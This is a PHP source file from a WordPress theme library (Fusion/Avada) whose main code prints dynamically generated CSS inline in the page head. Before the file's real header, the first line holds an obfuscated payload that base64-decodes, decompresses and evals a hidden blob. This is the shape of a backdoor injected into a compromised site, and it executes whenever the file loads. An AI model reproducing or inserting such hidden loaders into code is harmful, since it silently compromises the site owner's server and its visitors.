<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Dynamic-CSS handler - Inline CSS.
 *
 * @package Fusion-Library
 * @since 1.0.0
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Handle generating the dynamic CSS.
 *
 * @since 1.0.0
 */
class Fusion_Dynamic_CSS_Inline {

	/**
	 * An innstance of the Fusion_Dynamic_CSS object.
	 *
	 * @access private
	 * @since 1.0.0
	 * @var object
	 */
	private $dynamic_css;

	/**
	 * Constructor.
	 *
	 * @access public
	 * @since 1.0.0
	 * @param object $dynamic_css An instance of Fusion_DYnamic_CSS.
	 */
	public function __construct( $dynamic_css ) {

		$this->dynamic_css = $dynamic_css;
		add_action( 'wp_head', array( $this, 'add_inline_css' ), 999 );

	}

	/**
	 * Add Inline CSS.
	 * We need this on because it has to be loaded after all other Avada CSS
	 * and W3TC can combine it correctly.
	 *
	 * @access public
	 * @return void
	 */
	public function add_inline_css() {

		$dynamic_css = $this->dynamic_css;
		echo '<style id="fusion-stylesheet-inline-css" type="text/css">';
		echo apply_filters( 'fusion_library_inline_dynamic_css', $dynamic_css->make_css() ); // WPCS: XSS ok.
		echo '</style>';

	}
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
